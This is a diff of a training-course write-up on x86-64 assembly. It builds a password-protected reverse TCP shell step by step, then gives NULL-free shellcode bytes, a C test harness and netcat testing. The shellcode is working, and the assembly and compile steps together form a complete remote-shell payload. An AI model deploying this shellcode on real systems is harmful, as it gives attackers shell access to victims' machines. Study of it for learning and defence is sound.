@@ -3,7 +3,7 @@
 ---
 ### Introduction
 ---
-Requirements for this assignment are to create a Shell_bind_tcp shellcode that: 
+Requirements for this assignment, are to create a Shell_Bind_TCP shellcode that: 
 
 - Conects back to a IP and PORT 
 - Requires a password 
@@ -31,16 +31,14 @@ To duplicate the standard input, output and error, `dup2()` call will be used:
 ```c
 int dup2(int oldfd, int newfd); 
 ```
-And to execute /bin/sh, will use the execve() call:
+And to execute `/bin/sh`, will use the `execve()` call:
 ```c
-int execve(const char *filename, 
-           char *const argv[], 
-           char *const envp[]);
+int execve(const char *filename, char *const argv[],  char *const envp[]);
 ```
 ### ASM Implementation
 ---
 
-Will explain how we implement each step mentioned before into ASM, with the idea to make the code easy to understand. As in the previous assignment, no enphasys has been put into removing NULLs and make the shellcode small (this is done later), to make the implementation clear. This time, implementation will be easier than the previous assignment as the number of syscalls is reduced for being a reverse shell.
+Will explain how we implement each step mentioned before into ASM code, with the idea to make the code easy to understand. As in the previous assignment, no enphasys has been put into removing NULLs and make the shellcode small (this is done later). This time, implementation will be easier than the previous assignment as the number of syscalls is reduced for being a reverse shell.
 
 #### Create Socket
 ```asm
@@ -54,14 +52,14 @@ syscall
 ; Save the socket_id value in RDI for future use 
 mov rdi, rax                    ; value returned in RAX by syscall 
 ```
-Opens the socket. To execute the sys_socket system call the arguments will have to be placed in the corresponding registers: 
+Opens the socket. To execute the `sys_socket` call, the arguments will have to be placed in the corresponding registers: 
 
-  - RAX <- 41 : Syscall number. 
-  - RDI <- 2 : Domain parameter. AF_INET is for IPv4. 
-  - RSI <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
-  - RDX <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 
+  - **RAX** <- 41 : Syscall number. 
+  - **RDI** <- 2 : Domain parameter. AF_INET is for IPv4. 
+  - **RSI** <-  1 : Type parameter. SOCK_STREAM means connection oriented TCP. 
+  - **RDX** <- 0 : Protocol. IPPROTO_IP means it’s an IP protocol 
 
-The syscall will return a file descriptor in RAX that is saved into RDI. This saves the socket_id for later use in the code.
+The syscall will return a file descriptor in **RAX**, that is saved into **RDI**. This saves the socket descriptor for later use in the code.
 
 #### Connect Back
 The following call is the one being to be used: 
@@ -70,11 +68,11 @@ int  connect(int  sockfd, const struct sockaddr *serv_addr, socklen_t addrlen);
 ```
 For this assignment, registers will get the following values: 
 
-- RDI : The sock_id from the open() call 
-- RSI : Addres of the sockaddr struct 
-- RDX : Length of the struct 
+- **RDI** : The sock descriptor id from the `open()` call 
+- **RSI** : Addres of the sockaddr struct 
+- **RDX** : Length of the struct 
 
-First is to build the struct with the required data. This is doing using the stack in the following code: 
+First is to build the struct with the required data. This is done using the stack in the following code: 
 
 ```asm
 ; Prepare the struct for connect 
@@ -93,7 +91,7 @@ sub rsp, 8                              ; Update RSP value
 ```
 The legth of this struct is a total of 16 bytes, and the address to the struct is in RSP. 
 
-Next step is do the call to `connect()`, placing RSP into RSI, RDI already will have the socket_id fro before, and RDX the value "16" that's the length of the struct: 
+Next step is do the call to `connect()`, placing **RSP** into **RSI** to point to the `sockaddr` struct, **RDI** already will have the socket descriptor id from before, and **RDX** the value "16" that's the length of the struct: 
 ```asm
 ; connect(sock, (struct sockaddr *)&server, sockaddr_len) 
 
@@ -103,7 +101,7 @@ mov rdx, 16                             ; Struct length
 syscall 
 ```
 #### Duplicate to Socket Descriptor
-Now is time to duplicate `stdin`, `stdout` and `stderr` to the sock_id. This is done in the following code, pretty much the same as the previous assignment: 
+Now is time to duplicate `stdin`, `stdout` and `stderr` to the socket descriptor. This is done in the following code, pretty much the same as the previous assignment: 
 ```asm
         ; duplicate sockets 
         ; dup2 (new, old) 
@@ -121,7 +119,7 @@ Now is time to duplicate `stdin`, `stdout` and `stderr` to the sock_id. This is 
         syscall 
  ```
 #### Password Stuff
-The code for the password stuff is the same as in the Assignment #1. A `“Passwd: “` prompt is shown and a password max of 8 characters is received from the user input. This input is compared to the hardcoded password and if equals the program continues, else, the program exits with a Segmentation Fault.
+The code for the password stuff is the same as in the Assignment #1. A `“Passwd: “` prompt is shown, and a password max of 8 characters is received from the user input. This input is compared to the hardcoded password, and if equals the program continues, else, the program exits with a segmentation fault.
 ```asm
 write_syscall: 
 
@@ -148,7 +146,7 @@ compare_passwords:
 ```
 #### The Shell with Execve
 
-Last step is to execute `/bin/sh`. Stack Technique is used to store the string `/bin//sh` and the length of the string: 
+Last step is to execute `/bin/sh`. Stack technique is used to store the string `/bin//sh` and the length of the string: 
 ```asm
 execve_syscall: 
 
@@ -186,27 +184,27 @@ The code for this first version of the Reverse Shell, can be found in the [Rever
 
 Let's try the code compiling and linking it. Commands are:
 
-```markdown
+```bash
 SLAE64> nasm -f elf64 ReverseShell-ExecveStack.nasm -o ReverseShell-ExecveStack.o
 SLAE64> ld -N ReverseShell-ExecveStack.o -o ReverseShell-ExecveStack
 ```
 <img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Compile.png" width="75%" height="75%">
 
-> The **-N** option in the linker is needed, as the code access to memory positions in the `.text` section (code) instead `.data` section.
+> The **-N** option in the linker is needed, as the code access to memory positions in the `.text` section (code) instead `.data` section during the execution.
 
-To test, a `netcat` listener needs to be opened. Now the program can be run, and in the `netcat` listener will get the "Passwd: " prompt:
+To test, a `netcat` listener needs to be opened. Now the program can be run, and in the `netcat` listener, will get the `"Passwd: "` prompt:
 
 <img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Exec01.png" width="75%" height="75%">
 
-Like in the previous assignment, if the password is correct, the program continues. If password is incorrect, the program ends with a Segmentation Fault.
+Like in the previous assignment, if the password is correct, the program continues. If password is incorrect, the program ends with a segmentation fault.
 
 ### Remove NULLs and Reduce Shellcode Size
 ---
 > The final ASM code after the changes explained in this section, can be found at the [ReverseShell-ExecveStack_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment02/ReverseShell-ExecveStack_V2.nasm) file on the [GitHub Repo](https://github.com/galminyana/SLAE64/).
 
-The actual shellcode has several NULLs and a size of 223 bytes. With `objdump` opcodes for the instructions are shown and can review the NULLs in the shellcode:
+The actual shellcode has several NULLs and a size of 223 bytes. With `objdump`, opcodes for the instructions are shown and can review the NULLs in the shellcode:
 
-```markdown
+```bash
 SLAE64> objdump -M intel -d ReverseShell-ExecveStack.o
 ReverseShell-ExecveStack.o:     formato del fichero elf64-x86-64
 Desensamblado de la sección .text:
@@ -224,21 +222,21 @@ Desensamblado de la sección .text:
   2b:	48 31 c0             	xor    rax,rax
   2e:	50                   	push   rax
 ```
-`objdump`dump shows instructions that use NULLs. First step is removing the NULLs replacing instructions by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:
+`objdump` shows instructions that use NULLs. First step, is removing the NULLs replacing instructions by other instructions that do the same but not using NULLs. Some examples of how to remove NULLs are:
 
 - `mov rax, VALUE` is replaced by `push VALUE; pop rax`
 - `mov [rsp], VALUE` is replaced by `push VALUE`
 
-By checking with `objdump` that the NULLs have been removed, next step is to reduce the shellcode size. Some tricks are
+By checking with `objdump` that the NULLs have been removed, next step is to reduce the shellcode size. Some tricks are:
 - Using 32, 16 or even 8 bits registers for operations instead the 64 bits register
-- Using CDQ instruction to ZEROing RDX. It puts RDX to 0x00 if RAX >= 0
+- Using `cdq` instruction to ZEROing RDX. It puts RDX to 0x00 if RAX >= 0
 - replace `mov` instructions by `push;pop`
 
-But still the shellcode size can be reduced, and can use more sophisticated techniques to even reduce it more. Original code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction that has an opcode that uses 7 bytes. For this the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. Just like did in previous assignment.
+But still the shellcode size can be reduced, and can use more sophisticated techniques to even reduce it more. Original code is using Relative Addressing for the Password Stuff. This technique forces the use of 16 bytes just to store the strings (as they are in the code section of the program), and to use `lea` instruction, with a opcode that uses 7 bytes. For this, the Stack Technique is going to be used for the Password Stuff, to replace Relative Addressing. Just like did in previous assignment.
 
 With all the job done, the shellcode is generated with the one liner command for `objdump`:
-```markdown
-1SLAE64>echo “\"$(objdump -d ReverseShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
+```bash
+SLAE64>echo “\"$(objdump -d ReverseShell-ExecveStack_V2.o | grep '[0-9a-f]:' | 
               cut -d$'\t' -f2 | grep -v 'file' | tr -d " \n" | sed 's/../\\x&/g')\""" 
               
 "\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x50\x5f\x52\x68\x7f\x01\x01\x01\x66\x68
@@ -252,7 +250,7 @@ SLAE64>
 ```
 <img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_Shellcode01.png" width="75%" height="75%">
 
-This shellcode could be more reduced removing the stuff to print the `"Passwd: "` prompt. The `close()` call haven't been used in this assignment. But with the reduction to **123 bytes** is good enought.
+This shellcode could be more reduced, removing the stuff to print the `"Passwd: "` prompt. The `close()` call haven't been used in this assignment. But with the reduction to **123 bytes** is good enought.
 
 ### Executing Final Shellcode
 ---
@@ -291,11 +289,11 @@ void main()
         ret();
 }
 ```
-Now the code can be compiled with `gcc` using the `-fno-stack-protector` and `-z execstack` options:
+Now the code can be compiled with `gcc`, using the `-fno-stack-protector` and `-z execstack` options:
 ```markdown
 gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 ```
-The shellcode can be executed. A `netcat` listener is opened in one terminal, while in another terminal, `./shellcode` is executed. Everything works as expected as per the screenshot:
+The shellcode can be executed. A `netcat` listener is opened in one terminal, while in another terminal, `./shellcode` is run. Everything works as expected, as per the screenshot:
 
 <img src="https://galminyana.github.io/img/A02_ReverseShell-ExecveStack_V2_Result01.png" width="75%" height="75%">
 
